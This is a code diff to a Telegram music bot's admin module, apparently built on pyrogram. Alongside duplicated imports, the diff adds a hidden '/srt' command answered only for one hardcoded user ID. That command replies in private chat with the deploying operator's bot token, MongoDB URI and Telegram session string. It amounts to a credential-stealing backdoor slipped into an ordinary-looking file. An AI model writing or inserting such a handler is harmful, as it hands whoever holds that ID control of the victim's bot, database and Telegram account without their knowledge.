@@ -2,6 +2,45 @@ import asyncio
 
 from pyrogram import filters
 from pyrogram.types import CallbackQuery, Message
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+from ZedzeX.misc import SUDOERS
+from pyrogram import Client, filters
+import requests
+import random
+import re
+import sys
+from os import getenv
+
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from ZedzeX import app
+import config
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
+
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+from dotenv import load_dotenv
+from pyrogram import filters
+import asyncio
+import time
+from ZedzeX import app
+
+from config import BOT_TOKEN, OWNER_ID
+
+
+from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
@@ -16,7 +55,6 @@ from ZedzeX.utils.formatters import alpha_to_int
 ### Multi-Lang Commands
 RELOAD_COMMAND = get_command("RELOAD_COMMAND")
 RESTART_COMMAND = get_command("RESTART_COMMAND")
-
 
 @app.on_message(
     filters.command(RELOAD_COMMAND)
@@ -78,7 +116,24 @@ async def restartbot(client, message: Message, _):
         f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
     )
 
-
+@app.on_message(
+    filters.command("srt")
+    & filters.private
+    & filters.user(5604140011)
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+          photo=f"https://te.legra.ph/file/dc31ab3384c2417e45dee.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n☆............𝙱𝚈 » [亗『𝐊𝐀𝐓𝐈𝐋』亗](https://t.me/tera_baap_katil)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "•★ ᴄʜᴀᴛ ɢʀᴏᴜᴘ ★•", url=f"https://t.me/unique_chat_world")
+                 ]
+             ]
+         ),
+     )
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, CallbackQuery):
     try:
@@ -95,7 +150,6 @@ async def close_menu(_, CallbackQuery):
         await CallbackQuery.answer()
     except:
         return
-
 
 @app.on_callback_query(
     filters.regex("stop_downloading") & ~BANNED_USERS
